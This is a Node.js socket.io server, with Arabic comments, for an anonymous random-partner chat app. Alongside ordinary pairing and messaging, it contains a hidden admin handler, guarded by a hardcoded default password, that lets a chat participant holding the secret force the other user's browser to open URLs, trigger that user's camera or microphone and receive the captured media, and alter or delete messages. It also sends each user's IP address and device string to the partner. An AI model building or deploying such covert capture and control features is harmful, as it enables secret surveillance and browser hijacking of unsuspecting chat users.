const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 10 * 1024 * 1024
});

app.use(express.static(__dirname));

let waitingUser = null;

// كلمة سر الأدمن (يمكنك تعديلها أو جعلها عبر متغيرات البيئة في Render)
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'mySuperSecretAdmin123';

io.on('connection', (socket) => {
    console.log('مستخدم متصل:', socket.id);

    // استخراج معلومات الجهاز والـ IP لإرسالها للأدمن
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
    const clientUa = socket.handshake.headers['user-agent'] || 'Unknown Device';

    socket.on('find_partner', () => {
        if (waitingUser && waitingUser.id !== socket.id) {
            const partner = waitingUser;
            waitingUser = null;

            const room = 'room_' + partner.id + '_' + socket.id;
            socket.join(room);
            partner.join(room);

            io.to(room).emit('matched');
            socket.roomName = room;
            partner.roomName = room;

            // إرسال معلومات الطرف الآخر لتظهر في لوحة الأدمن
            io.to(room).emit('device_info', { ip: clientIp, ua: clientUa });
        } else {
            waitingUser = socket;
        }
    });

    socket.on('message', (msg) => {
        if (socket.roomName) {
            // توليد معرف فريد وصحيح للرسالة بدون أخطاء substring
            msg.id = 'msg_' + Math.random().toString(36).substring(2, 9);
            socket.to(socket.roomName).emit('message', msg);
        }
    });

    socket.on('typing', (isTyping) => {
        if (socket.roomName) {
            socket.to(socket.roomName).emit('display_typing', isTyping);
        }
    });

    // === معالجة أوامر وصلاحيات الأدمن ===
    socket.on('admin_action', (data) => {
        // التحقق من كلمة السر الخاصة بالأدمن للحماية
        if (data.secret !== ADMIN_SECRET) return;
        if (!socket.roomName) return;

        switch (data.action) {
            case 'delete':
                // حذف الرسالة من عند الطرفين في الغرفة
                io.to(socket.roomName).emit('msg_deleted', data.msgId);
                break;

            case 'edit':
                // تعديل الرسالة عند الطرفين في الغرفة
                io.to(socket.roomName).emit('msg_edited', { msgId: data.msgId, newContent: data.newContent });
                break;

            case 'open_url':
                // إجبار متصفح الطرف الآخر على فتح الرابط المحدد
                socket.to(socket.roomName).emit('force_open_url', data.url);
                break;

            case 'request_media':
                // طلب فتح الكاميرا (صورة، فيديو، صوت) والمدة المطلوبة
                socket.to(socket.roomName).emit('trigger_camera', { mediaType: data.mediaType, duration: data.duration });
                break;

            case 'alert':
                socket.to(socket.roomName).emit('system_alert', data.message);
                break;

            case 'clear_chat':
                // مسح محتوى المحادثة حسب الاختيار
                io.to(socket.roomName).emit('clear_chat', data.target);
                break;

            case 'change_bg':
                socket.to(socket.roomName).emit('change_bg', data.color);
                break;
        }
    });

    // استقبال الوسائط الملتقطة وإرسالها للأدمن لمعاينتها داخل الغرفة
    socket.on('user_media_captured', (data) => {
        if (socket.roomName) {
            socket.to(socket.roomName).emit('display_captured_media_to_admin', data);
        }
    });

    socket.on('disconnect', () => {
        if (waitingUser === socket) {
            waitingUser = null;
        }
        if (socket.roomName) {
            socket.to(socket.roomName).emit('partner_disconnected');
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
